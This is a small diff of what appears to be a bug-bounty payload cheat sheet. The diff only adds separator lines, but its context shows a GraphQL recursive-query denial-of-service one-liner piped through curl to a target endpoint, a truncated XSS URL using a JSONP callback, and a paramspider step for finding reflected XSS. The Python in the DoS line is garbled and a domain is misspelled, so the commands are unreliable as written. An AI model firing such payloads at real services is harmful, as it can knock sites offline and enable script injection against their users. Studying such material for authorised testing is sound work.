@@ -155,6 +155,7 @@ echo "https://target.com/search?q=<script src=https://target.com/api/jsonp?callb
 35. GraphQL DoS via Recursive Query Bomb
 
 echo 'query{users{posts{comments{author{posts{comments{author{posts{comments{author{posts{comments{author{id}}}}}}}}}}}}}}' | python3 -c "import sys; q=http://sys.stdin.read(); print(q*100)" | curl -X POST https://target.com/graphql -d @- -H "Content-Type: application/json" --max-time 60
+##############################################
 
 
 
@@ -175,10 +176,9 @@ echo 'query{users{posts{comments{author{posts{comments{author{posts{comments{aut
 
 
 
+############################################
 
-
-
-Quick tip to find reflected xss:
+# Quick tip to find reflected xss:
 
 1- python3 http://paramspider.py --domain http://domian.com
 
